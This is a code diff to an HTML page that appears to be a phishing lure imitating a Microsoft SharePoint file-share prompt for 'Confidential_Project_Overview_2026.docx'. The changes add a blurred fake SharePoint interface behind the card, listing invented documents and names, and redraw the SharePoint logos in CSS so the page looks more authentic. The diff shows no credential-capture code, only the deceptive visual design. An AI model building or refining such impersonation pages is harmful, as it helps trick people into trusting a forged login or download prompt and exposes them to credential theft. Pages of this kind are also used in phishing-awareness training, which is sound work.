@@ -13,18 +13,116 @@
 
         body {
             font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
-            background: linear-gradient(135deg, #f3f2f1 0%, #e1dfdd 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Blurred SharePoint Background Interface */
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            filter: blur(8px);
+            transform: scale(1.1);
+        }
+
+        .sp-header {
+            height: 48px;
+            background: #0078d4;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 15px;
+        }
+
+        .sp-waffle {
+            width: 20px;
+            height: 20px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2px;
+        }
+
+        .sp-waffle span {
+            background: white;
+            border-radius: 1px;
+        }
+
+        .sp-title {
+            color: white;
+            font-size: 16px;
+            font-weight: 300;
+        }
+
+        .sp-nav {
+            height: 44px;
+            background: white;
+            border-bottom: 1px solid #e1e1e1;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 20px;
+        }
+
+        .sp-nav-item {
+            font-size: 14px;
+            color: #323130;
+        }
+
+        .sp-content {
+            background: #f3f2f1;
+            height: calc(100% - 92px);
+            padding: 20px;
+        }
+
+        .sp-doc-list {
+            background: white;
+            border-radius: 2px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            padding: 16px;
+        }
+
+        .sp-list-header {
+            display: flex;
+            gap: 40px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #e1e1e1;
+            font-size: 12px;
+            color: #605e5c;
+            font-weight: 600;
+        }
+
+        .sp-list-item {
+            display: flex;
+            gap: 40px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f3f2f1;
+            font-size: 13px;
+            color: #323130;
+        }
+
+        .sp-icon {
+            width: 16px;
+            height: 16px;
+            background: #0078d4;
+            border-radius: 2px;
+            display: inline-block;
+            margin-right: 8px;
         }
 
         .container {
             width: 100%;
             max-width: 440px;
             animation: fadeIn 0.5s ease-out;
+            z-index: 1;
         }
 
         @keyframes fadeIn {
@@ -35,7 +133,7 @@
         .card {
             background: white;
             border-radius: 2px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 1px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2), 0 0 1px rgba(0, 0, 0, 0.1);
             overflow: hidden;
         }
 
@@ -108,10 +206,44 @@
             font-weight: 500;
         }
 
-        .sharepoint-badge svg {
+        /* SharePoint Logo CSS */
+        .sp-logo-small {
             width: 12px;
             height: 12px;
-            fill: currentColor;
+            position: relative;
+        }
+
+        .sp-logo-small::before {
+            content: '';
+            position: absolute;
+            width: 5px;
+            height: 5px;
+            background: #0078d4;
+            border-radius: 50%;
+            top: 0;
+            left: 0;
+        }
+
+        .sp-logo-small::after {
+            content: '';
+            position: absolute;
+            width: 5px;
+            height: 5px;
+            background: #0078d4;
+            border-radius: 50%;
+            bottom: 0;
+            right: 0;
+        }
+
+        .sp-logo-dot {
+            position: absolute;
+            width: 5px;
+            height: 5px;
+            background: #0078d4;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
         }
 
         .lock-icon {
@@ -232,6 +364,7 @@
             justify-content: space-between;
             align-items: center;
             font-size: 12px;
+            background: #faf9f8;
         }
 
         .footer-link {
@@ -244,18 +377,70 @@
             text-decoration: underline;
         }
 
-        .sharepoint-logo {
+        /* SharePoint Logo in Footer */
+        .sharepoint-brand {
             color: #605e5c;
             font-weight: 600;
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
+            font-size: 13px;
         }
 
-        .sharepoint-logo svg {
-            width: 16px;
-            height: 16px;
-            fill: #0078d4;
+        .sp-logo {
+            width: 18px;
+            height: 18px;
+            position: relative;
+        }
+
+        .sp-logo-circle {
+            position: absolute;
+            width: 7px;
+            height: 7px;
+            background: #0078d4;
+            border-radius: 50%;
+        }
+
+        .sp-logo-circle.top-left {
+            top: 0;
+            left: 0;
+        }
+
+        .sp-logo-circle.bottom-right {
+            bottom: 0;
+            right: 0;
+        }
+
+        .sp-logo-circle.center {
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 8px;
+            height: 8px;
+            background: #0078d4;
+        }
+
+        /* Connecting lines */
+        .sp-logo::before {
+            content: '';
+            position: absolute;
+            width: 2px;
+            height: 8px;
+            background: #0078d4;
+            top: 3px;
+            left: 8px;
+            transform: rotate(45deg);
+        }
+
+        .sp-logo::after {
+            content: '';
+            position: absolute;
+            width: 2px;
+            height: 8px;
+            background: #0078d4;
+            bottom: 3px;
+            left: 8px;
+            transform: rotate(-45deg);
         }
 
         /* Loading state */
@@ -290,6 +475,47 @@
     </style>
 </head>
 <body>
+    <!-- Blurred SharePoint Background -->
+    <div class="background">
+        <div class="sp-header">
+            <div class="sp-waffle">
+                <span></span><span></span><span></span>
+                <span></span><span></span><span></span>
+                <span></span><span></span><span></span>
+            </div>
+            <div class="sp-title">SharePoint</div>
+        </div>
+        <div class="sp-nav">
+            <div class="sp-nav-item">Home</div>
+            <div class="sp-nav-item">Documents</div>
+            <div class="sp-nav-item">Recent</div>
+        </div>
+        <div class="sp-content">
+            <div class="sp-doc-list">
+                <div class="sp-list-header">
+                    <div style="flex: 2;">Name</div>
+                    <div style="flex: 1;">Modified</div>
+                    <div style="flex: 1;">Modified By</div>
+                </div>
+                <div class="sp-list-item">
+                    <div style="flex: 2;"><span class="sp-icon"></span>Project_Alpha.docx</div>
+                    <div style="flex: 1;">2 hours ago</div>
+                    <div style="flex: 1;">John Smith</div>
+                </div>
+                <div class="sp-list-item">
+                    <div style="flex: 2;"><span class="sp-icon"></span>Budget_2026.xlsx</div>
+                    <div style="flex: 1;">Yesterday</div>
+                    <div style="flex: 1;">Sarah Jones</div>
+                </div>
+                <div class="sp-list-item">
+                    <div style="flex: 2;"><span class="sp-icon"></span>Meeting_Notes.pdf</div>
+                    <div style="flex: 1;">3 days ago</div>
+                    <div style="flex: 1;">Mike Wilson</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div class="container">
         <div class="card">
             <div class="card-header">
@@ -303,7 +529,9 @@
                         <div class="file-name">Confidential_Project_Overview_2026.docx</div>
                         <div class="file-meta">
                             <span class="sharepoint-badge">
-                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                                <div class="sp-logo-small">
+                                    <div class="sp-logo-dot"></div>
+                                </div>
                                 Shared via SharePoint
                             </span>
                             <span>•</span>
@@ -352,10 +580,12 @@
             </div>
             
             <div class="card-footer">
-                <div class="sharepoint-logo">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
-                    </svg>
+                <div class="sharepoint-brand">
+                    <div class="sp-logo">
+                        <div class="sp-logo-circle top-left"></div>
+                        <div class="sp-logo-circle center"></div>
+                        <div class="sp-logo-circle bottom-right"></div>
+                    </div>
                     SharePoint
                 </div>
                 <a href="#" class="footer-link">Privacy statement</a>
